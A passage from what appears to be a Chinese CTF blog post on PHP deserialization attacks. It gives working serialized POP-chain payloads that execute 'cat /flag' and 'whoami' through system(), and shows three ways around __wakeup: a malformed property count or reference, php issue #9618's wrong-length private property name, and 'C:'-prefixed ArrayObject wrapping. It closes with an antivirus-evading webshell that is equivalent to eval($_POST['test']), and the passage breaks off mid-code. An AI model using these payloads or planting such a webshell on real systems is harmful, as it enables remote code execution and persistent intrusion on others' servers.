<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">pop</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;show&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;ctf&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">11</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;secret_code&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;code&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;fine&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cmd&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">6</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;system&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">7</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;content&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">9</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cat /flag&#34;</span>;}<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">r</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">10</span>;}}}</span></span></code></pre></div><p>或者在r;10;后面加一个1：</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">?</span><span style="color:#58a1dd">pop</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;show&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;ctf&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">11</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;secret_code&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;code&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">5</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;sorry&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;name&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">8</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;password&#34;</span>;<span style="color:#58a1dd">N</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;key&#34;</span>;<span style="color:#58a1dd">O</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;fine&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span><span style="color:#ff636f">:</span>{<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">3</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cmd&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">6</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;system&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">7</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;content&#34;</span>;<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">9</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;cat /flag&#34;</span>;}<span style="color:#58a1dd">s</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">4</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">&#34;hint&#34;</span>;<span style="color:#58a1dd">r</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">10</span>;<span style="color:#a6be9d">1</span>}}}}</span></span></code></pre></div><p>都可以实现wakeup绕过</p>
<h2 id="php-issue9618" class="heading-element"><span>php issue#9618</span>
  <a href="#php-issue9618" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://github.com/php/php-src/issues/9618"target="_blank" rel="external nofollow noopener noreferrer">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在==__wakeup之前调用__destruct()函数==版本：</p>
<ul>
<li>7.4.x -7.4.30</li>
<li>8.0.x</li>
</ul>
<p>本地起一个环境：</p>
<pre tabindex="0"><code>&lt;?php
highlight_file(__FILE__);
class A
{
    public $info;
    private $end = &#34;1&#34;;

    public function __destruct()
    {
        $this-&gt;info-&gt;func();
        echo &#34;des&#34;;
    }
}

class B
{
    public $znd;

    public function __wakeup()
    {
        $this-&gt;znd = &#34;exit();&#34;;
        echo &#39;__wakeup&#39;;
    }
    
    public function __call($method, $args)
    {
        echo &#34;__call &#34;;
    }
}
if(isset($_POST[&#39;pop&#39;])){
    @unserialize($_POST[&#39;pop&#39;]);
}</code></pre><p>payload：</p>
<pre tabindex="0"><code>&lt;?php
class A
{
    public $info;
    private $end = &#34;1&#34;;

    public function __destruct()
    {
    }
}

class B
{
    public $znd;

    public function __wakeup()
    {

    }
    
    public function __call($method, $args)
    {
    }
}
$test=new A();
$test-&gt;info=new B();
echo serialize($test);
#O:1:&#34;A&#34;:2:{s:4:&#34;info&#34;;O:1:&#34;B&#34;:1:{s:3:&#34;znd&#34;;N;}s:6:&#34;Aend&#34;;s:1:&#34;1&#34;;}</code></pre><p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=small, https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/03/1-22.jpg?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>成功绕过wakeup</p>
<p>**原理：**声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上<code>\0*\0</code>的前缀。这里的\0 表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0 组合。也就是说当实例化的类里存在私有属性时比如private时，序列化它时会出现字符长度那里会出现不可见字符，比如：</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-1-1024x360.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>可以看到私有属性Aend那里A的前后两边都出现了不可见字符，而我们传入以及服务器接受的payload实际上为O:1:”A”:2:{s:4:”info”;O:1:”B”:1:{s:3:”znd”;N;}s:6:”Aend”;s:1:”1″;}，这就导致理论上Aend长度为6但实际上不是，最后导致wakeup()绕过，原理应该和fast-destruct相似：</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-2.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-2.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-2.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-2.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>但事实上只有这种情况能够绕过wakeup，也就是destruct和wakeup在不同的类的时候，如果他们存在同一个类时输入直接serialize得到的payload是没有回显的：</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-3.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-3.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-3.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-3.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>只有当我们用<code>%00</code>代替不可见字符时，才会进行正常的反序列化输出，但却是按正常顺序输出的wakeup并不会被绕过</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-4.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-4.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-4.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-4.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>你这时不难想到如果给最初destruct和wakeup不同类的payload加上%00会怎么样呢，答案是这种情况下就会正常反序列化，不能绕过wakeup了</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-5-1024x792.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>感觉还是和fast-destruct以及php的GC回收的算法有关，不想研究了，摆了</p>
<h2 id="使用c绕过" class="heading-element"><span>使用C绕过</span>
  <a href="#%e4%bd%bf%e7%94%a8c%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>php7.3.4</p>
<p>挺早之前我就知道使用C代替O能绕过wakeup，但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容，这次比赛学到了种新方法，就是把正常的反序列化进行一次打包，让最后生成的payload以C开头即可</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">error_reporting</span>(<span style="color:#a6be9d">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">highlight_file</span>(<span style="color:#58a1dd">__FILE__</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">ctfshow</span>{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__wakeup</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">die</span>(<span style="color:#a6be9d">&#34;not allowed!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">system</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctfshow</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_GET</span>[<span style="color:#a6be9d">&#39;1+1&gt;2&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">if</span>(<span style="color:#ff636f">!</span><span style="color:#58a1dd">preg_match</span>(<span style="color:#a6be9d">&#34;/^[Oa]:[\d]+/i&#34;</span>, <span style="color:#58a1dd">$data</span>)){
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">unserialize</span>(<span style="color:#58a1dd">$data</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>class ctfshow{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    public function __wakeup(){
</span></span><span style="display:flex;"><span>        die(&#34;not allowed!&#34;);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    public function __destruct(){
</span></span><span style="display:flex;"><span>        system($this-&gt;ctfshow);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>$a=new ctfshow();
</span></span><span style="display:flex;"><span>echo serialize($a);
</span></span><span style="display:flex;"><span>#O:7:&#34;ctfshow&#34;:0:{}
</span></span></code></pre></div><p>我们把O改成C传入C:7:”ctfshow”:0:{}可以看到网页显示bypass</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-6.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-6.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-6.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-6.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>但你只能这么传入，稍微改一点就没反应了，更别说向里面传值了，这里我们可以使用ArrayObject对正常的反序列化进行一次包装，让最后输出的payload以C开头(官方文档说：This class allows objects to work as arrays.)</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">ctfshow</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">$ctfshow</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__wakeup</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">die</span>(<span style="color:#a6be9d">&#34;not allowed!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">echo</span> <span style="color:#a6be9d">&#34;OK&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">system</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctfshow</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">ctfshow</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$a</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">ctfshow</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;whoami&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$arr</span><span style="color:#ff636f">=</span><span style="color:#ff636f">array</span>(<span style="color:#a6be9d">&#34;evil&#34;</span><span style="color:#ff636f">=&gt;</span><span style="color:#58a1dd">$a</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$oa</span><span style="color:#ff636f">=</span><span style="color:#ff636f">new</span> <span style="color:#58a1dd">ArrayObject</span>(<span style="color:#58a1dd">$arr</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$res</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">serialize</span>(<span style="color:#58a1dd">$oa</span>);
</span></span><span style="display:flex;"><span><span style="color:#ff636f">echo</span> <span style="color:#58a1dd">$res</span>;
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//unserialize($res)
</span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#828b96;font-style:italic">?&gt;</span>
</span></span><span style="display:flex;"><span>#C:11:&#34;ArrayObject&#34;:77:{x:i:0;a:1:{s:4:&#34;evil&#34;;O:7:&#34;ctfshow&#34;:1:{s:7:&#34;ctfshow&#34;;s:6:&#34;whoami&#34;;}};m:a:0:{}}
</span></span></code></pre></div><p>最后成功命令执行</p>
<p><img loading="lazy" src="https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png" alt="img" srcset="https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png?size=small, https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png?size=medium 1.5x, https://fushuling.com/wp-content/uploads/2023/04/1-7-1024x565.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>但我本地尝试的时候发现这种包装方法对php版本有要求，我用7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，除了这个函数还有其他方法可以对payload进行包装，具体可以参考[愚人杯3rd <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#"target="_blank" rel="external nofollow noopener noreferrer">easy_php]</a>：</p>
<blockquote>
<p>实现了unserialize接口的大概率是C打头，经过所有测试发现可以用的类为：</p>
<ul>
<li>ArrayObject::unserialize</li>
<li>ArrayIterator::unserialize</li>
<li>RecursiveArrayIterator::unserialize</li>
<li>SplObjectStorage::unserialize</li>
</ul>
</blockquote>
<h1 id="destruct免杀" class="heading-element"><span>destruct免杀</span>
  <a href="#destruct%e5%85%8d%e6%9d%80" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><p>以下代码就相当于<code>&lt;?php @eval($_POST['test']);?&gt;</code></p>
<p>此木马毕竟是跟正常文件太像，所以免杀效果很不错。</p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff636f">&lt;?</span><span style="color:#58a1dd">php</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">class</span> <span style="color:#58a1dd">A</span>{ 
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">var</span> <span style="color:#58a1dd">$test</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;demo&#34;</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">function</span> <span style="color:#58a1dd">__destruct</span>(){ 
</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">@</span><span style="color:#ff636f">eval</span>(<span style="color:#58a1dd">$this</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">test</span>); 
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$test</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">$_POST</span>[<span style="color:#a6be9d">&#39;test&#39;</span>]; 
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">$len</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">strlen</span>(<span style="color:#58a1dd">$test</span>)<span style="color:#ff636f">+</span><span style="color:#a6be9d">1</span>; 
